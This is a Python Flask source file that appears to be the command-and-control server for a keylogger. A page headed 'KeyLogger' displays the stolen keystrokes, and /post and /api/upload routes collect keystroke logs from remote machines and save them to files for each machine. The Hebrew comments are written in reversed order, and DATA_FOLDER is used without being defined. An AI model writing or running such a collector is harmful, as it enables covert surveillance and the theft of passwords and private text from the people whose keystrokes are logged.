from flask import Flask, jsonify, request
import time
import os

app=Flask(__name__)
data=''
@app.route('/',methods=['GET'])
def response_data():
    head = f'<h1> KeyLogger </h1><p1>{data}</p1>'
    return head

@app.route('/post',methods=['POST'])
def requests_data():
    global data
    req=request.data
    data +=str(req)
    print(data)
    return 'OK'

def generate_log_filename():
    # הריזחמ םש ץבוק ססובמה לע תמתוח ןמז
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    # תריצי הייקית רובע רישכמה םא הניא תמייק
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

        # תריצי םש ץבוק שדח יפל תמתוח ןמז
    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    # ןתינ ףיסוהל ןאכ דוביע ,ףסונ לשמל תפסוה תמתוח ןמז תפסונ ךותב ץבוקה
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200



if __name__==('__main__'):
    app.run(debug=True)